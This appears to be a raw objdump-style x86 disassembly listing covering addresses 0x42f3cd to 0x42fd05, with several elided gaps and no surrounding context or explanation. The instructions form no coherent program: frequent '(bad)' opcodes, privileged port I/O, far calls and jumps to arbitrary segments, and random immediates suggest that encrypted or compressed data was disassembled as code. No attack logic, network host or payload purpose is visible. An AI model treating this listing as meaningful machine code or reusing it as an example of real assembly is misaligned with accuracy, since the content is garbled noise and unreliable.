  42f3cd:	outs   dx,DWORD PTR ds:[esi]
  42f3ce:	cwde   
  42f3cf:	mov    bl,0x80
  42f3d1:	push   esp
  42f3d2:	leave  
  42f3d3:	mov    ebx,0x36228885
  42f3d8:	pop    esi
  42f3d9:	out    dx,eax
  42f3da:	popf   
  42f3db:	adc    eax,0x1e8f66eb
  42f3e0:	jae    0x42f3a8
  42f3e2:	jmp    edi
  42f3e4:	dec    ebx
  42f3e5:	dec    DWORD PTR [edi+0x49]
  42f3e8:	inc    ecx
  42f3e9:	(bad)  
  42f3ea:	in     al,dx
  42f3eb:	repz loop 0x42f3cc
  42f3ee:	sbb    BYTE PTR [edi],al
  42f3f0:	out    0x1c,eax
  42f3f2:	jecxz  0x42f38b
  42f3f4:	adc    edx,ebx
  42f3f6:	stos   DWORD PTR es:[edi],eax
  42f3f7:	mov    cl,0x91
  42f3f9:	leave  
  42f3fa:	mov    esi,0xf3aaa11f
  42f3ff:	dec    ecx
  42f400:	adc    BYTE PTR [esi-0x5a841806],ah
  42f406:	in     al,dx
  42f407:	mov    fs,ebx
  42f409:	aam    0x4b
  42f40b:	inc    esp
  42f40c:	test   eax,0x72bea9ee
  42f411:	xor    al,0xf0
  42f413:	pop    eax
  42f414:	mov    dh,0xd6
  42f416:	in     al,0x72
  42f418:	outs   dx,BYTE PTR ds:[esi]
  42f419:	mov    esp,0x4b16aaa6
  42f41e:	popf   
  42f41f:	jecxz  0x42f49b
  42f421:	(bad)  
  42f422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f423:	pop    edx
  42f424:	mov    WORD PTR [ecx+ebp*8+0x188d0bda],cs
  42f42b:	or     DWORD PTR [ecx-0x3a],ecx
  42f42e:	jecxz  0x42f44a
  42f430:	push   esi
  42f431:	inc    eax
  42f432:	push   es
  42f433:	jnp    0x42f491
	...
  42f495:	add    BYTE PTR [edi],dh
  42f497:	jae    0x42f4e3
  42f499:	cdq    
  42f49a:	dec    esi
  42f49b:	mov    ecx,0x1986fff7
  42f4a0:	jge    0x42f502
  42f4a2:	inc    eax
  42f4a3:	ret    0x2516
  42f4a6:	jmp    0x742f6a5
  42f4ab:	add    DWORD PTR [eax],eax
  42f4ad:	add    ah,cl
  42f4af:	jns    0x42f4a8
  42f4b1:	shr    dl,cl
  42f4b3:	in     al,dx
  42f4b4:	ficomp DWORD PTR cs:[edi-0x2b461c25]
  42f4bb:	iret   
  42f4bc:	pop    ebx
  42f4bd:	xchg   ecx,eax
  42f4be:	in     eax,dx
  42f4bf:	adc    bh,al
  42f4c1:	mov    al,0x61
  42f4c3:	push   ebx
  42f4c4:	leave  
  42f4c5:	jns    0x42f4d5
  42f4c7:	shr    BYTE PTR [ebx+ecx*4-0x80],cl
  42f4cb:	sar    DWORD PTR [eax],cl
  42f4cd:	or     al,BYTE PTR [esi-0xf376099]
  42f4d3:	retf   0x79ef
  42f4d6:	call   0xcdf0:0x49517728
  42f4dd:	cli    
  42f4de:	dec    ecx
  42f4df:	or     DWORD PTR [esi+esi*8-0x874335],esp
  42f4e6:	inc    esp
  42f4e7:	je     0x42f50c
  42f4e9:	mov    bl,0x2e
  42f4eb:	sub    al,0x85
  42f4ed:	cmp    BYTE PTR [ebp+0x5cd6d573],cl
  42f4f3:	(bad)  
  42f4f4:	loope  0x42f49f
  42f4f6:	or     al,BYTE PTR [ecx-0x61]
  42f4f9:	mov    esp,ebp
  42f4fb:	sti    
  42f4fc:	mov    eax,ds:0x5f1ba9ea
  42f501:	je     0x42f4a1
  42f503:	clc    
  42f504:	test   eax,0xd3a6c12c
  42f509:	pop    edx
  42f50a:	stos   DWORD PTR es:[edi],eax
  42f50b:	or     cl,BYTE PTR [esi]
  42f50d:	sahf   
  42f50e:	lods   al,BYTE PTR ds:[esi]
  42f50f:	minps  xmm2,XMMWORD PTR [esi]
  42f512:	(bad)  
  42f513:	push   0x6a
  42f515:	hlt    
  42f516:	sbb    esi,DWORD PTR ds:0x8f81db5a
  42f51c:	inc    eax
  42f51d:	pop    DWORD PTR [eax]
  42f51f:	jge    0x42f4ce
  42f521:	loope  0x42f4f6
  42f523:	in     eax,0x8f
  42f525:	and    BYTE PTR ds:0xa7686da,0x2
  42f52c:	mov    bh,0x36
  42f52e:	adc    DWORD PTR [edx],0xffffffb4
  42f531:	xchg   ecx,eax
  42f532:	mov    DWORD PTR [ecx],esp
  42f534:	or     ch,BYTE PTR [edx]
  42f536:	stos   BYTE PTR es:[edi],al
  42f537:	cmp    BYTE PTR [ebp+0x4b],cl
  42f53a:	pop    ecx
  42f53b:	adc    eax,0xdb2f3ca1
  42f540:	pop    ebx
  42f541:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f542:	repz pop esi
  42f544:	pop    ebx
  42f545:	adc    eax,0x28ad1d10
  42f54a:	mov    DWORD PTR [ecx-0x5e],ecx
  42f54d:	mov    ds:0x5a6f54ea,al
  42f552:	mov    esi,0x86e1bc6f
  42f557:	xor    ebx,DWORD PTR [edi+0x53]
  42f55a:	test   al,0x7b
  42f55c:	add    esp,esp
  42f55e:	sbb    bh,al
  42f560:	(bad)  
  42f561:	jmp    0x42f51b
  42f563:	sub    al,0xc9
  42f565:	jmp    0x2343:0x71dffb90
  42f56c:	ja     0x42f59b
  42f56e:	fmul   st,st(5)
  42f570:	cmp    ebp,DWORD PTR [esp+ebp*1-0x5f3ebf1a]
  42f577:	inc    edi
  42f578:	mov    al,ds:0xe7a4905c
  42f57d:	pop    ebx
  42f57e:	retf   
  42f57f:	lahf   
  42f580:	js     0x42f536
  42f582:	mov    al,ds:0xd05628e4
  42f587:	xor    BYTE PTR [edi-0x4f],bl
  42f58a:	add    edi,DWORD PTR [esi-0x2fd62b37]
  42f590:	adc    DWORD PTR [ebx-0x3e3a197d],ebp
  42f596:	and    eax,0xfea74321
  42f59b:	frstor [edi-0x48b5b0cf]
  42f5a1:	mov    eax,DWORD PTR [esi]
  42f5a3:	fimul  WORD PTR [edi]
  42f5a5:	pop    ecx
  42f5a6:	aaa    
  42f5a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f5a8:	inc    esi
  42f5a9:	jg     0x42f5b0
  42f5ab:	mov    bl,0xa1
  42f5ad:	push   es
  42f5ae:	fld    DWORD PTR [esi+ebx*1-0x7a]
  42f5b2:	inc    edx
  42f5b3:	pushf  
  42f5b4:	or     al,0x0
	...
  42f616:	ds push esi
  42f618:	into   
  42f619:	nop
  42f61a:	out    dx,al
  42f61b:	cwde   
  42f61c:	jle    0x42f61c
  42f61e:	pop    edx
  42f61f:	or     bh,BYTE PTR [ebx+edx*2+0x26]
  42f623:	aaa    
  42f624:	stos   BYTE PTR es:[edi],al
  42f625:	fcomip st,st(0)
  42f627:	sti    
  42f628:	add    DWORD PTR [eax],eax
  42f62a:	pop    es
  42f62b:	add    DWORD PTR [eax],eax
  42f62d:	add    BYTE PTR [ebx],dl
  42f62f:	sbb    BYTE PTR [edx],ch
  42f631:	xchg   eax,edi
  42f633:	fisubr WORD PTR [edx]
  42f635:	mov    al,ds:0xf390f567
  42f63a:	ja     0x42f611
  42f63c:	push   esp
  42f63d:	adc    bl,dl
  42f63f:	or     bl,BYTE PTR [ecx]
  42f641:	adc    DWORD PTR [eax],ebx
  42f643:	jl     0x42f60b
  42f645:	jo     0x9d0e5c78
  42f64b:	retf   0x74c8
  42f64e:	aaa    
  42f64f:	nop
  42f650:	stc    
  42f651:	sub    al,0x79
  42f653:	cmp    ah,BYTE PTR [eax+0x71]
  42f656:	test   eax,0xccc35c0a
  42f65b:	gs add eax,0xd03b0ad3
  42f661:	ss aaa 
  42f663:	push   ds
  42f664:	mul    DWORD PTR [esi-0x25]
  42f667:	(bad)  
  42f668:	pop    ds
  42f669:	cs out 0x37,eax
  42f66c:	scas   eax,DWORD PTR es:[edi]
  42f66d:	fmul   DWORD PTR [edi+0x72ff95f6]
  42f673:	add    al,BYTE PTR cs:[edi]
  42f676:	(bad)  
  42f677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f678:	jns    0x42f6a9
  42f67a:	mov    bl,0xbb
  42f67c:	sub    ebp,DWORD PTR [esi-0x4d37d522]
  42f682:	loop   0x42f697
  42f684:	ins    BYTE PTR es:[edi],dx
  42f685:	adc    eax,DWORD PTR [edi+edx*8]
  42f688:	push   ebp
  42f689:	aad    0x3d
  42f68b:	jmp    0x53852df8
  42f690:	je     0x42f6d3
  42f692:	in     eax,0x15
  42f694:	in     eax,dx
  42f695:	out    0x20,eax
  42f697:	adc    BYTE PTR [edx-0xb],0x93
  42f69b:	inc    esi
  42f69c:	pop    edx
  42f69d:	sub    BYTE PTR [edi-0x1f],ah
  42f6a0:	ss mov ebp,0xb9e9e5cc
  42f6a6:	adc    bl,ch
  42f6a8:	add    dl,bh
  42f6aa:	push   0xffffffa8
  42f6ac:	xor    al,0x6a
  42f6ae:	ss inc edi
  42f6b0:	sub    ebx,0x44
  42f6b3:	pop    esp
  42f6b4:	outs   dx,BYTE PTR ds:[esi]
  42f6b5:	lahf   
  42f6b6:	dec    ecx
  42f6b7:	cmp    BYTE PTR [ebx*1+0x419f0901],0xf7
  42f6bf:	mov    dh,0x27
  42f6c1:	pusha  
  42f6c2:	lock jecxz 0x42f740
  42f6c5:	pop    ebx
  42f6c6:	fstp   st(0)
  42f6c8:	xchg   ebp,eax
  42f6c9:	pop    esp
  42f6ca:	es scas eax,DWORD PTR es:[edi]
  42f6cc:	sub    al,BYTE PTR [ebx-0x38ca5a58]
  42f6d2:	fwait
  42f6d3:	pop    ebx
  42f6d4:	hlt    
  42f6d5:	ficom  WORD PTR [ebx+0x3d963273]
  42f6db:	add    eax,0x6fd2034b
  42f6e0:	dec    edi
  42f6e1:	sub    ah,BYTE PTR ds:0xffdccc6a
  42f6e7:	inc    edi
  42f6e8:	xlat   BYTE PTR ds:[ebx]
  42f6e9:	les    eax,FWORD PTR [eax]
  42f6eb:	jno    0x42f6fe
  42f6ed:	cmp    BYTE PTR [ebp+0xf],al
  42f6f0:	add    cl,bl
  42f6f2:	fsubp  st(3),st
  42f6f4:	and    dl,BYTE PTR [edx-0x3eaeba33]
  42f6fa:	or     BYTE PTR [ebp+0x4485143d],bl
  42f700:	iret   
  42f701:	icebp  
  42f702:	mov    esp,DWORD PTR [esi-0x2f]
  42f705:	imul   esi,DWORD PTR [ecx-0x5],0x6e38a173
  42f70c:	ds jo  0x42f766
  42f70f:	sbb    eax,DWORD PTR [ebx]
  42f711:	je     0x42f6e7
  42f713:	push   ebx
  42f714:	ss loop 0x42f6d6
  42f717:	sub    ebx,eax
  42f719:	and    ebp,DWORD PTR [ebx]
  42f71b:	jl     0x42f778
  42f71d:	out    dx,eax
  42f71e:	imul   esi,DWORD PTR [ebp+0xf],0xf413aba
  42f725:	inc    esi
  42f726:	cmp    bl,cl
  42f728:	aam    0x74
  42f72a:	ds inc ebp
  42f72c:	call   0xc6f9:0x4de3016c
  42f733:	and    eax,ebx
	...
  42f795:	add    BYTE PTR [ecx-0x5f],dh
  42f798:	(bad)  
  42f799:	test   al,0xd6
  42f79b:	(bad)  
  42f79c:	jg     0x42f797
  42f79e:	in     al,0x8a
  42f7a0:	jmp    0x42f76f
  42f7a2:	pop    esp
  42f7a3:	test   eax,0xfcf7cc08
  42f7a8:	add    DWORD PTR [eax],eax
  42f7aa:	pop    es
  42f7ab:	add    DWORD PTR [eax],eax
  42f7ad:	add    BYTE PTR [eax],cl
  42f7af:	inc    esp
  42f7b0:	jecxz  0x42f7ee
  42f7b2:	cmp    esp,eax
  42f7b4:	xchg   esp,eax
  42f7b5:	xor    cl,BYTE PTR [edx]
  42f7b7:	pop    esp
  42f7b8:	dec    esp
  42f7b9:	sub    edx,DWORD PTR [edx]
  42f7bb:	popa   
  42f7bc:	or     eax,0xd1cefaee
  42f7c1:	outs   dx,BYTE PTR ds:[esi]
  42f7c2:	jmp    0x42f7ae
  42f7c4:	int    0xb4
  42f7c6:	neg    eax
  42f7c8:	into   
  42f7c9:	fwait
  42f7ca:	sub    ecx,DWORD PTR [ebx]
  42f7cc:	dec    ebp
  42f7cd:	dec    ecx
  42f7ce:	and    eax,0x59d88ac5
  42f7d3:	or     ah,al
  42f7d5:	fimul  DWORD PTR [edi-0x6f]
  42f7d8:	cli    
  42f7d9:	sti    
  42f7da:	xlat   BYTE PTR ds:[ebx]
  42f7db:	xchg   ecx,eax
  42f7dc:	call   0x7a57:0xacfb1cd4
  42f7e3:	cmp    al,0x5c
  42f7e5:	sti    
  42f7e6:	add    DWORD PTR [edi],ecx
  42f7e8:	dec    edi
  42f7e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f7ea:	popa   
  42f7eb:	or     al,0x91
  42f7ed:	sahf   
  42f7ee:	xor    DWORD PTR [edi+0xe],0x63301c10
  42f7f5:	gs sahf 
  42f7f7:	and    al,BYTE PTR [esi+0x637d5553]
  42f7fd:	sbb    WORD PTR [eax-0x72f6dc6a],bp
  42f804:	es jg  0x42f80f
  42f807:	inc    esp
  42f808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f809:	and    al,0x13
  42f80b:	bound  ebp,QWORD PTR [esi+0x5999fc3a]
  42f811:	out    dx,eax
  42f812:	inc    ecx
  42f813:	jg     0x42f7b4
  42f815:	div    cl
  42f817:	popa   
  42f818:	xchg   ebp,eax
  42f819:	fiadd  WORD PTR [edi]
  42f81b:	mov    es,WORD PTR [eax+esi*1]
  42f81e:	mov    BYTE PTR [edi-0x2e],bl
  42f821:	test   BYTE PTR [ecx],ch
  42f823:	lods   eax,DWORD PTR ds:[esi]
  42f824:	push   ebp
  42f825:	dec    eax
  42f826:	sub    eax,0xbd640a2f
  42f82b:	pushf  
  42f82c:	sbb    esp,DWORD PTR [esi]
  42f82e:	mov    dl,0xf1
  42f830:	or     eax,0x7361ffed
  42f835:	cmp    cl,BYTE PTR [ecx+edi*8+0x7cb55b2c]
  42f83c:	fisubr DWORD PTR [ecx+0x46]
  42f83f:	dec    ecx
  42f840:	and    ah,BYTE PTR [ebx-0x2944104b]
  42f846:	add    bh,BYTE PTR [ebp-0x3c]
  42f849:	scas   eax,DWORD PTR es:[edi]
  42f84a:	jl     0x42f8a9
  42f84c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f84d:	xor    eax,0x82773d0e
  42f852:	sbb    edx,edi
  42f854:	cmp    ch,cl
  42f856:	mov    cl,BYTE PTR [edi+0x67]
  42f859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f85a:	in     eax,dx
  42f85b:	jb     0x42f88f
  42f85d:	sbb    dl,BYTE PTR [eax]
  42f85f:	dec    edx
  42f860:	xchg   cx,ax
  42f862:	cmp    dl,BYTE PTR [ebp-0x5e]
  42f865:	or     ebx,0x23
  42f868:	out    dx,al
  42f869:	fdivr  st,st(0)
  42f86b:	int    0x2d
  42f86d:	jl     0x42f88f
  42f86f:	cmp    ecx,DWORD PTR [esi-0x17b29021]
  42f875:	stos   DWORD PTR es:[edi],eax
  42f876:	inc    edi
  42f877:	out    0xd9,al
  42f879:	lds    edx,FWORD PTR [ebp-0x2]
  42f87c:	mov    ch,0x8a
  42f87e:	and    ebp,DWORD PTR [ecx+0x45]
  42f881:	xchg   esp,eax
  42f882:	shl    ah,0xdb
  42f885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f886:	adc    BYTE PTR [ecx+0x3b],bh
  42f889:	aad    0x3a
  42f88b:	pop    ss
  42f88c:	push   ecx
  42f88d:	or     ebx,esp
  42f88f:	or     esp,DWORD PTR [eax+0x70]
  42f892:	pusha  
  42f893:	(bad)  
  42f894:	neg    ah
  42f896:	fs call 0xbe9a:0xaba7f736
  42f89e:	loopne 0x42f8a1
  42f8a0:	xchg   edx,eax
  42f8a1:	mov    ebx,DWORD PTR [ecx]
  42f8a3:	lods   al,BYTE PTR ds:[esi]
  42f8a4:	fwait
  42f8a5:	sti    
  42f8a6:	mov    dh,0x5a
  42f8a8:	lods   eax,DWORD PTR es:[esi]
  42f8aa:	push   edi
  42f8ab:	pop    ebp
  42f8ac:	dec    ebp
  42f8ad:	popf   
  42f8ae:	stc    
  42f8af:	pop    ds
  42f8b0:	das    
  42f8b1:	pop    ebx
  42f8b2:	mov    al,ds:0x3bf
	...
  42f913:	add    BYTE PTR [eax],al
  42f915:	add    BYTE PTR [esp+esi*2],dl
  42f918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f919:	push   ebp
  42f91a:	in     al,0xd5
  42f91c:	cmc    
  42f91d:	jne    0x42f8e0
  42f91f:	ror    DWORD PTR [ecx+0x1af9e69c],1
  42f925:	loop   0x42f925
  42f927:	std    
  42f928:	add    DWORD PTR [eax],eax
  42f92a:	pop    es
  42f92b:	add    DWORD PTR [eax],eax
  42f92d:	add    BYTE PTR [ebp+0x693add03],al
  42f933:	mov    ?,WORD PTR [esp+esi*8+0x3a]
  42f937:	push   edx
  42f938:	aas    
  42f939:	dec    edx
  42f93a:	pop    DWORD PTR [ebx-0x41574b50]
  42f940:	in     al,dx
  42f941:	fmul   DWORD PTR [ebx+0x7699d939]
  42f947:	je     0x42f8e1
  42f949:	and    ebx,DWORD PTR ds:0x2a81c347
  42f94f:	mov    eax,0x1aae6549
  42f954:	ficom  DWORD PTR [ebx]
  42f956:	inc    ecx
  42f957:	xlat   BYTE PTR ds:[ebx]
  42f958:	fmul   QWORD PTR [ecx+0xe]
  42f95b:	(bad)  
  42f95c:	push   ds
  42f95d:	aad    0x77
  42f95f:	push   0xffffff92
  42f961:	mov    eax,0x2f7db0d3
  42f966:	adc    esp,DWORD PTR [ebp-0x5e5844da]
  42f96c:	daa    
  42f96d:	push   0xffffffef
  42f96f:	shl    DWORD PTR [ebx+0x2fcf80ed],0x9d
  42f976:	pop    edx
  42f977:	pusha  
  42f978:	jl     0x42f981
  42f97a:	push   cs
  42f97b:	jmp    0xe74:0xfdc1a09a
  42f982:	in     eax,0xe7
  42f984:	jnp    0x42f919
  42f986:	push   cs
  42f987:	ins    DWORD PTR es:[edi],dx
  42f988:	ins    BYTE PTR es:[edi],dx
  42f989:	inc    esi
  42f98a:	mov    BYTE PTR ds:0x92069ea9,ch
  42f990:	push   ss
  42f991:	(bad)  
  42f993:	xor    DWORD PTR [ebp+0x72a62857],ebp
  42f999:	icebp  
  42f99a:	inc    esi
  42f99b:	or     dl,BYTE PTR [edi]
  42f99d:	xor    al,0x1d
  42f99f:	sub    DWORD PTR [ecx],esi
  42f9a1:	or     edi,DWORD PTR [eax]
  42f9a3:	cmp    esp,DWORD PTR [edi]
  42f9a5:	mov    WORD PTR [edx+0x4a],fs
  42f9a8:	sti    
  42f9a9:	pop    edx
  42f9aa:	dec    ebp
  42f9ab:	les    ebx,FWORD PTR [eax+0x3e]
  42f9ae:	gs out dx,eax
  42f9b0:	in     al,dx
  42f9b1:	das    
  42f9b2:	femms  
  42f9b4:	mov    ah,0xef
  42f9b6:	cmp    al,0xab
  42f9b8:	inc    edx
  42f9b9:	clc    
  42f9ba:	push   eax
  42f9bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f9bc:	adc    al,0xf7
  42f9be:	rol    DWORD PTR [ebx+0x5],cl
  42f9c1:	lods   al,BYTE PTR ds:[esi]
  42f9c2:	jl     0x42f976
  42f9c4:	cmp    al,0x6f
  42f9c6:	or     BYTE PTR [ebx+0x141ed7b5],0x15
  42f9cd:	iret   
  42f9ce:	or     eax,0xe1fdbf5e
  42f9d3:	or     bh,BYTE PTR [ecx]
  42f9d5:	jns    0x42f95d
  42f9d7:	call   0x6f2c:0x8272a5af
  42f9de:	or     eax,0xc7e378e8
  42f9e3:	mov    cl,0xf9
  42f9e5:	jmp    0xc63b4374
  42f9ea:	cdq    
  42f9eb:	xor    DWORD PTR [esi+eiz*8+0x576ae950],edx
  42f9f2:	(bad)  
  42f9f3:	icebp  
  42f9f4:	cdq    
  42f9f5:	fisub  WORD PTR [edx]
  42f9f7:	sbb    BYTE PTR [eax+0x58],0xca
  42f9fb:	(bad)  
  42f9fc:	fsubr  QWORD PTR [edx-0x30859595]
  42fa02:	xchg   edx,eax
  42fa03:	lea    edi,[edx]
  42fa05:	lock jle 0x42fa4f
  42fa08:	sbb    eax,esp
  42fa0a:	outs   dx,DWORD PTR ds:[esi]
  42fa0b:	xchg   ebx,eax
  42fa0c:	minps  xmm2,XMMWORD PTR [edx]
  42fa0f:	sti    
  42fa10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa11:	fwait
  42fa12:	ja     0x42f9fc
  42fa14:	call   DWORD PTR [esi]
  42fa16:	push   ss
  42fa17:	aaa    
  42fa18:	jp     0x42fa70
  42fa1a:	test   al,0x5e
  42fa1c:	jmp    0x42fa8b
  42fa1e:	clc    
  42fa1f:	jmp    0x42fa22
  42fa21:	out    0x6b,eax
  42fa23:	push   ecx
  42fa24:	add    BYTE PTR [edx],bl
  42fa26:	cwde   
  42fa27:	dec    edx
  42fa28:	sub    BYTE PTR [eax+0x1d7b10bf],ch
  42fa2e:	jno    0x42f9bd
  42fa30:	gs hlt 
  42fa32:	je     0x42fa15
  42fa34:	xor    al,0x0
	...
  42fa96:	sbb    ebp,edi
  42fa98:	shl    BYTE PTR [esi],0xf4
  42fa9b:	aas    
  42fa9c:	(bad)  
  42fa9d:	out    dx,eax
  42fa9e:	sbb    dl,BYTE PTR [esi+eiz*8-0x1c]
  42faa2:	stc    
  42faa3:	rol    BYTE PTR ds:0x1ff059e,0x0
  42faaa:	pop    es
  42faab:	add    DWORD PTR [eax],eax
  42faad:	add    ah,dh
  42faaf:	fwait
  42fab0:	test   BYTE PTR [ebp+0x1c521a66],cl
  42fab6:	inc    edx
  42fab7:	mov    BYTE PTR [bp+di],bl
  42faba:	out    0x11,eax
  42fabc:	adc    esp,ebx
  42fabe:	sub    ebx,DWORD PTR [eax+0x4ec47db9]
  42fac4:	push   ebx
  42fac5:	sbb    DWORD PTR [edx],ebp
  42fac7:	push   esi
  42fac8:	ret    
  42fac9:	push   0xffffffde
  42facb:	call   0x4a0171c1
  42fad0:	mov    ah,0x98
  42fad2:	out    dx,eax
  42fad3:	in     al,0x10
  42fad5:	lea    esp,[edx-0x54]
  42fad8:	stos   BYTE PTR es:[edi],al
  42fad9:	xor    eax,0xba0884e5
  42fade:	xlat   BYTE PTR ds:[ebx]
  42fadf:	xor    al,BYTE PTR [eax-0x60]
  42fae2:	iret   
  42fae3:	add    dl,BYTE PTR [ebp-0x3c]
  42fae6:	fist   DWORD PTR [ebp+eiz*4+0xe]
  42faea:	fcmovne st,st(4)
  42faec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42faed:	in     eax,dx
  42faee:	xor    cl,BYTE PTR [ebx+0x1db01151]
  42faf4:	jecxz  0x42fa95
  42faf6:	sub    bl,BYTE PTR [edx]
  42faf8:	cli    
  42faf9:	pop    es
  42fafa:	mov    bh,BYTE PTR [edi]
  42fafc:	shr    DWORD PTR [edx],0x25
  42faff:	popa   
  42fb00:	add    BYTE PTR [eax-0x2089e176],ah
  42fb06:	cwde   
  42fb07:	inc    esp
  42fb08:	retf   
  42fb09:	adc    BYTE PTR gs:[esi-0x2251b6b4],ah
  42fb10:	xchg   esi,eax
  42fb11:	or     al,0xe7
  42fb13:	add    al,0x49
  42fb15:	repnz add eax,0x167e36e0
  42fb1b:	ret    
  42fb1c:	fild   WORD PTR [edx+0x1832abdb]
  42fb22:	inc    edx
  42fb23:	cmp    ecx,DWORD PTR [edx+0x8]
  42fb26:	sub    ah,bl
  42fb28:	push   0xe8006a6a
  42fb2d:	xor    ah,bl
  42fb2f:	push   edi
  42fb30:	mov    ds:0xe11cd684,eax
  42fb35:	inc    eax
  42fb36:	mov    dh,0xbd
  42fb38:	jmp    0x42fb6b
  42fb3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fb3b:	dec    esi
  42fb3c:	push   0xffffffe7
  42fb3e:	out    dx,al
  42fb3f:	add    eax,0xa59a4e33
  42fb44:	(bad)  
  42fb45:	push   esp
  42fb46:	popf   
  42fb47:	retf   0x1620
  42fb4a:	icebp  
  42fb4b:	pushf  
  42fb4c:	mov    ecx,0x52d26032
  42fb51:	sbb    BYTE PTR [eax],dl
  42fb53:	pop    ss
  42fb54:	jge    0x42fb77
  42fb56:	pop    ss
  42fb57:	jmp    0xe711462d
  42fb5c:	add    eax,DWORD PTR [eax-0x411ae9d5]
  42fb62:	jle    0x42fb52
  42fb64:	inc    ebp
  42fb65:	ffree  st(7)
  42fb67:	sub    BYTE PTR [edx],cl
  42fb69:	fild   QWORD PTR [esi]
  42fb6b:	out    dx,eax
  42fb6c:	pop    eax
  42fb6d:	test   ebx,eax
  42fb6f:	out    0xd4,eax
  42fb71:	mov    dh,0x87
  42fb73:	cs jecxz 0x42fbcf
  42fb76:	inc    ebp
  42fb77:	mov    DWORD PTR [ebx+eiz*1],esp
  42fb7a:	inc    ecx
  42fb7b:	(bad)  
  42fb7c:	jecxz  0x42fb0f
  42fb7e:	xlat   BYTE PTR es:[ebx]
  42fb80:	xor    al,BYTE PTR [ecx]
  42fb82:	aaa    
  42fb83:	jo     0x42fb16
  42fb85:	push   ebx
  42fb86:	int    0x8e
  42fb88:	(bad)
  42fb8d:	rol    DWORD PTR [ecx-0x5af3c0e4],1
  42fb93:	in     al,0xa4
  42fb95:	call   0x5f969c6a
  42fb9a:	fiadd  DWORD PTR [eax+0x3d]
  42fb9d:	and    dl,BYTE PTR [ebx+0x5c4c4170]
  42fba3:	int3   
  42fba4:	les    eax,FWORD PTR [esp+edx*8+0x2d]
  42fba8:	sbb    eax,0x272dd22d
  42fbad:	mov    al,0x32
  42fbaf:	sbb    BYTE PTR [ecx],bh
  42fbb1:	xor    ebx,DWORD PTR [esi]
  42fbb3:	ja     0x42fbc0
	...
  42fc15:	add    BYTE PTR [ebx],cl
  42fc17:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fc1d:	call   0x6aef:0x9e5607ea
  42fc24:	jnp    0x42fc17
  42fc26:	or     al,0x0
  42fc28:	add    al,BYTE PTR [eax]
  42fc2a:	pop    es
  42fc2b:	add    DWORD PTR [eax],eax
  42fc2d:	add    BYTE PTR [edi-0x58],bl
  42fc30:	dec    esi
  42fc31:	pop    es
  42fc32:	ins    BYTE PTR es:[edi],dx
  42fc33:	loope  0x42fbd4
  42fc35:	in     al,0x57
  42fc37:	repz rol DWORD PTR [edi-0x521b022a],1
  42fc3e:	sub    ch,bl
  42fc40:	stc    
  42fc41:	jae    0x42fc0a
  42fc43:	push   edi
  42fc44:	jb     0x42fc47
  42fc46:	rcl    bh,cl
  42fc48:	xor    esi,DWORD PTR [esi]
  42fc4a:	cmp    eax,0x4b0a7756
  42fc4f:	dec    edx
  42fc50:	popf   
  42fc51:	cmc    
  42fc52:	sbb    DWORD PTR [ecx+0x254ca9d8],ebx
  42fc58:	dec    ebx
  42fc59:	adc    DWORD PTR [eax+0x3357c4f3],0xffffffdd
  42fc60:	xchg   esi,eax
  42fc61:	mov    ecx,DWORD PTR [edx-0x26f4c569]
  42fc67:	test   DWORD PTR [esi-0x3c],0x685eb3dc
  42fc6e:	mov    dh,0x92
  42fc70:	push   edi
  42fc71:	adc    DWORD PTR [esi-0x4d0e5cb3],esp
  42fc77:	adc    al,0x89
  42fc79:	cli    
  42fc7a:	rol    DWORD PTR [ecx+0x1d],cl
  42fc7d:	xchg   BYTE PTR ds:0x2ca36b8f,cl
  42fc83:	mov    eax,0x43dd35bc
  42fc88:	in     al,dx
  42fc89:	add    dh,BYTE PTR [ebp-0x40508f6e]
  42fc8f:	jo     0x42fcb8
  42fc91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fc92:	outs   dx,BYTE PTR ds:[esi]
  42fc93:	rcl    BYTE PTR [ecx-0xe3ab0c6],0x36
  42fc9a:	test   esi,ebp
  42fc9c:	add    BYTE PTR [ebx+0x60],bh
  42fc9f:	xor    al,0x9a
  42fca1:	mov    ecx,0xcd9a7d20
  42fca6:	and    esp,edx
  42fca8:	sub    al,0x58
  42fcaa:	inc    eax
  42fcab:	pop    edi
  42fcac:	sbb    al,0xea
  42fcae:	inc    ebx
  42fcaf:	push   es
  42fcb0:	mov    edi,0x69a80ad8
  42fcb5:	cmp    eax,0x26b769b5
  42fcba:	int3   
  42fcbb:	and    BYTE PTR [eax+0x1a],dh
  42fcbe:	mov    dh,0x4e
  42fcc0:	cli    
  42fcc1:	rol    ah,0xca
  42fcc4:	add    BYTE PTR [edx-0x3a435bc6],al
  42fcca:	addr16 std 
  42fccc:	stc    
  42fccd:	aad    0xfd
  42fccf:	xor    BYTE PTR [ecx],ah
  42fcd1:	(bad)  
  42fcd2:	push   ecx
  42fcd3:	test   al,0x56
  42fcd5:	stc    
  42fcd6:	cwde   
  42fcd7:	inc    esp
  42fcd8:	or     eax,0x6c50b809
  42fcdd:	mov    ?,WORD PTR [ecx+0x30dac076]
  42fce3:	push   edx
  42fce4:	popf   
  42fce5:	pop    ebx
  42fce6:	jmp    DWORD PTR [ebp-0x2c]
  42fce9:	jae    0x42fcd0
  42fceb:	retf   
  42fcec:	ins    BYTE PTR es:[edi],dx
  42fced:	sub    DWORD PTR [ebp+0x32d97e9c],ebx
  42fcf3:	dec    esp
  42fcf4:	sti    
  42fcf5:	cld    
  42fcf6:	pop    eax
  42fcf7:	addr16 xchg edx,eax
  42fcf9:	ret    0x85fe
  42fcfc:	in     eax,0x59
  42fcfe:	push   eax
  42fcff:	std    
  42fd00:	mov    eax,ds:0xd1060ee4
  42fd05:	adc    ebp,DWORD PTR [ebx+0x4090816f]
